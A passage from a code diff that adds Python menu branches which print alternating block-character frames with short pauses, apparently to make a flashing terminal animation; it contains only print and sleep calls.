+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+
+
+        elif choice == '33':
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
